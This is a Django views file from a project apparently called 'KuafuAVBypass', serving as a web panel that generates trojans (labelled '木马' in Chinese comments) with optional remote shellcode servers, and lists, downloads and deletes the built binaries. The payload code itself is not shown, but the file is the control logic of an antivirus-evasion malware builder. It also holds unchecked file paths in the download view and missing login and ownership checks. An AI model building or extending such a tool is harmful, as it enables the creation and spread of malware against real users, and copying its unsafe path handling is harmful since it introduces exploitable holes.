

#Create your views here.
from django.shortcuts import render,redirect
from django.http import HttpResponse
from .forms import TrojanListForm
from .models import TrojanList
from .utils .TrojanCompileInterface import compileService
from django.contrib.auth.decorators import login_required
from django.core.paginator import Paginator, EmptyPage, PageNotAnInteger
from django.http import FileResponse  # 更加推荐使用这个，因为它会懒加载文件
from django.http import Http404
import os
from django.http import HttpResponseNotAllowed
from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from KuafuAVBypass import settings
from os.path import normpath
import re
import json


def create_trojan(request):
    if request.method == 'POST':
        form = TrojanListForm(request.POST,request.FILES)
        if form.is_valid():
            # 如果需要，这里可以执行额外的处理，比如计算文件哈希
            trojan = form.save(commit=False)
            trojan.user = request.user
            if trojan.shellcode_remote:
                if not trojan.user.shellcode_ip_addr:
                    return JsonResponse({"success": False, 'message': '远程shellcode服务器地址为空！'})
            trojan.save()
            trojan = compileService(trojan)
            if not trojan:
                return JsonResponse({"success": False, 'message': '木马编译错误！'})
            trojan.save()
            # 重定向到其他页面，比如展示所有记录的列表页面
            return JsonResponse({"success": True, 'message': '木马生成成功！'})
        else:
            errors_json = form.errors.as_json()
            errors_dict = json.loads(errors_json)
            
            # 提取错误信息
            error_messages = []
            for field, errors in errors_dict.items():
                for error in errors:
                    # 每个字段可能有多个错误信息，都需要被提取
                    error_messages.append(error['message'])
                    
            # 返回一个包含错误信息的JSON响应，指明上传失败
            return JsonResponse({"success": False, "message": " ; ".join(error_messages)})
    else:
        # 如果是GET请求，显示一个空的表单
        form = TrojanListForm()
        return render(request, 'shellcode.html', {'form': form})


def save_hash(trojan_id, hash_value):
    try:
        # 使用模型名Trojan而不是表单名TrojanListForm
        trojan = TrojanList.objects.get(pk=trojan_id)
        trojan.file_hash = hash_value
        trojan.save()
        return True
    except TrojanList.DoesNotExist:
        print(f"Trojan with id {trojan_id} does not exist.")
        return False
    


@login_required(login_url='/login')
def trojan_view(request):
    # 获取分页参数
    page = request.GET.get('page', 1)
    per_page = request.GET.get('per_page', 13)

    # 过滤当前用户的 TrojanList 对象并按创建时间降序排列
    user_trojans = TrojanList.objects.filter(user=request.user).order_by('-created_at')

    # 使用 Paginator 进行分页处理
    paginator = Paginator(user_trojans, per_page)
    try:
        trojan_page = paginator.page(page)
    except PageNotAnInteger:
        # 如果页码不是一个整数，则默认显示第一页
        trojan_page = paginator.page(1)
    except EmptyPage:
        # 如果页码超出范围（例如9999），则显示最后一页
        trojan_page = paginator.page(paginator.num_pages)

    # 渲染模板，传递当前页的 TrojanList 对象和分页信息
    return render(request, 'trojan.html', {
        'trojans': trojan_page,  # 注意：这里为了与模板中预期的变量匹配，我将变量名从 'trojan' 改为了 'trojans'
    })

def download_file(request, fileName):
    if request.method != 'GET':
        raise Http404("This method is not allowed")

    file_path = os.path.join('media', 'binaryfile', fileName)
    if os.path.exists(file_path):
        response = FileResponse(open(file_path, 'rb'))
        response['Content-Disposition'] = 'attachment; filename=' + os.path.basename(file_path)
        return response
    else:
        raise Http404("File does not exist")
    

def delete_trojan(request, trojan_id):
    if request.method != 'POST':
        return HttpResponseNotAllowed(['POST'])

    try:
        trojan_to_delete = get_object_or_404(TrojanList, id=trojan_id)
        trojan_path = os.path.join('media', 'binaryfile', trojan_to_delete.file_hash)
        os.remove(trojan_path)
        trojan_to_delete.delete()
        return JsonResponse({"success": True, "message": "木马删除成功"})
    except TrojanList.DoesNotExist:
        # 不太可能到达这里，因为 get_object_or_404 会在对象不存在时抛出 Http404
        return JsonResponse({"success": False, "message": "木马不存在"}, status=404)
